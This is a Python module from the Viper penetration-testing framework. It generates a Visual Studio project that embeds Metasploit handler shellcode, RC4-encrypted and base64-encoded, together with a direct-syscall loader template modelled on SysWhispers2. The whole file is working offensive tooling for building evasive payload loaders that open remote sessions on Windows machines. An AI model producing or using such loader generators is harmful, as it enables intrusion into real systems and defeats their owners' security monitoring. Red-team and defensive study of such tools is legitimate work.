# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :
import base64
import time

from Lib.ModuleAPI import *
from Lib.rc4 import encrypt


class PostModule(PostPythonModule):
    NAME_ZH = "Syscall的Visual Studio工程"
    DESC_ZH = "模块生成一个VS工程,工程中包含syscall的基本使用方法及加密后的shellcode"

    NAME_EN = "Syscall Visual Studio project"
    DESC_EN = "Module generates a Visual Studio project, which includes the basic usage of syscall and encrypted shellcode"

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/rlommn"]
    REFERENCES = ["https://github.com/jthuraisamy/SysWhispers2"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        return True, None

    def run(self):
        second = self.generate_payload("base64")
        key = self.random_str(48)

        first = encrypt(key, second.decode())
        zero = base64.b64encode(first).decode()

        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=zero, SHELLCODE_KEY=key)
        projectfilename = f"VS_Syscall_Project_{int(time.time())}.zip"
        self.write_zip_vs_project(filename=projectfilename, source_code=source_code)

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}",
                      f"Please check the generated zip file in <Files>: {projectfilename}")
